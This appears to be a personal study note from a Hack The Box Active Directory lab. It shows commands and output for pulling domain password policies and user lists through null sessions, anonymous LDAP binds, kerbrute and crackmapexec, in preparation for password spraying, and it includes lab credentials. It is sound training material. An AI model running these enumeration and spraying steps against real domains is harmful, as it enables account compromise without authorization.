# 👀 Sighting In, Hunting For A User

## Enumerating & Retrieving Password Policies

### Password Policy - from Linux - Credentialed

If we already obtained valid credentials, we can use crackmapexec or `rpcclient`.:

```
ElFelixio@htb[/htb]$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Dumping password info for domain: INLANEFREIGHT
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password length: 8
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Password history length: 24
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Maximum password age: Not Set
```

And there we have the password policy

### Password Policy - from Linux - SMB NULL Sessions

If we don't have credentials we could try null sessions or LDAP anonymous bind&#x20;

* SMB NULL session. SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. For enumeration, we can use tools such as `enum4linux`, `CrackMapExec`, `rpcclient`, etc

```shell-session
ElFelixio@htb[/htb]$ rpcclient -U "" -N 172.16.5.5

rpcclient $> querydominfo
Domain:		INLANEFREIGHT
Server:		
Comment:	
Total Users:	3650
[...]
```

For the password policy we would need to use this option:&#x20;

```shell-session
getdompwinfo
```

We could also use `enum4linux` to enumerate hosts and domains:

```
ElFelixio@htb[/htb]$ enum4linux -P 172.16.5.5

<SNIP>

 ================================================== 
|    Password Policy Information for 172.16.5.5    |
 ================================================== 

[+] Attaching to 172.16.5.5 using a NULL share
[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:172.16.5.5)

[+] Trying protocol 445/SMB...
[+] Found domain(s):

	[+] INLANEFREIGHT
	[+] Builtin

[+] Password Info for Domain: INLANEFREIGHT

	[+] Minimum password length: 8
	[+] Password history length: 24
	[+] Maximum password age: Not Set
	[+] Password Complexity Flags: 000001

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 1

	[+] Minimum password age: 1 day 4 minutes 
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: 5
	[+] Forced Log off Time: Not Set

[+] Retieved partial password policy with rpcclient:

Password Complexity: Enabled
Minimum Password Length: 8

enum4linux complete on Tue Feb 22 17:39:29 2022
```

We can see plenty of very useful information such as lockout policy and password complexity policy

Using enum4linux, we could export data as YAML or JSON files which can later be used to process the data further or feed it to other tools

```
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

The output would be maybe more readble:

```shell-session
ElFelixio@htb[/htb]$ cat ilfreight.json 

{
    "target": {
        "host": "172.16.5.5",
        "workgroup": ""
    },
    "credentials": {
        "user": "",
        "password": "",
        "random_user": "yxditqpc"
    },
    "services": {
        "SMB": {
            "port": 445,
            "accessible": true
        },
[...]
```

### Password Policy - from Linux - LDAP Anonymous Bind

[LDAP anonymous binds](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.

We could use some well known tools to enumerate for password policy (`windapsearch.py`, `ldapsearch`, `ad-ldapdomaindump.py`, etc)

**Using ldapsearch**

```
ElFelixio@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 5
maxPwdAge: -9223372036854775808
minPwdAge: -864000000000
minPwdLength: 8
[...]
```

we can see the minimum password length of 8, lockout threshold of 5

### Password Policy - from Windows

**Using net.exe**

```cmd-session
C:\htb> net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          Unlimited
Minimum password length:                              8
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.
```

Here we can glean the following information:

* Passwords never expire (Maximum password age set to Unlimited)
* The minimum password length is 8 so weak passwords are likely in use
* The lockout threshold is 5 wrong passwords
* Accounts remained locked out for 30 minutes

**Using PowerView**

```
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy
```

## Password Spraying

Before spraying we first need a list of valid domain users to attempt to authenticate with.

Several techniques exists like&#x20;

* leveraging an SMB NULL session
* LDAP anonymous bind to query LDAP anonymously
* `Kerbrute` to validate users utilizing a word list
* [linkedin2username](https://github.com/initstring/linkedin2username) to create a list of potentially valid users
* Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using `Responder`

No matter the method we choose, it is also vital for us to consider the domain password policy.

Weneed to know minimum password length, account lockout threshold and how many minutes we should wait between spray attempts.

### SMB NULL Session to Pull User List

**Using enum4linux**

```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

administrator
guest
krbtgt
lab_adm
htb-student
avazquez
pfalcon
fanthony
[...]
```

**Using rpcclient**

It's good to know the `enumdomusers` command after connecting anonymously using `rpcclient`.

```
rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers 
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
[...]
```

**Using CrackMapExec --users Flag**

This method will also show the `badpwdcount` (invalid login attempts), so we can remove any accounts from our list that are close to the lockout threshold. It also shows the `baddpwdtime`, which is the date and time of the last bad password attempt, so we can see how close an account is to having its `badpwdcount` reset.

```
crackmapexec smb 172.16.5.5 --users

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
[...]
```

### Gathering Users with LDAP Anonymous

**Using ldapsearch**

```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

guest
ACADEMY-EA-DC01$
ACADEMY-EA-MS01$
ACADEMY-EA-WEB01$
htb-student
avazquez
[...]
```

**Using windapsearch**

Here we can specify anonymous access by providing a blank username with the `-u` flag and the `-U` flag to tell the tool to retrieve just users

```
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 2906 users: 

cn: Guest

cn: Htb Student
userPrincipalName: htb-student@inlanefreight.local
[...]
```

**Kerbrute User Enumeration**

```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:16:11 >  Using KDC(s):
2022/02/17 22:16:11 >  	172.16.5.5:88

2022/02/17 22:16:11 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
[...]
```

Be aware that using kerbrute will generate event ID [4768: A Kerberos authentication ticket (TGT) was requested](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768).

### Credentialed Enumeration to Build our User List

With valid credentials, we can use any of the tools stated previously to build a user list.

**Using CrackMapExec with Valid Credentials**

```
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

[sudo] password for htb-student: 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\htb-student:Academy_student_AD! 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 1 baddpwdtime: 2022-02-23 21:43:35.059620
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
[...]
```

### Practical example:

I was able to retrieve 56 valid users with this simple command:

```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

<figure><img src="../../../.gitbook/assets/image (1052).png" alt=""><figcaption></figcaption></figure>
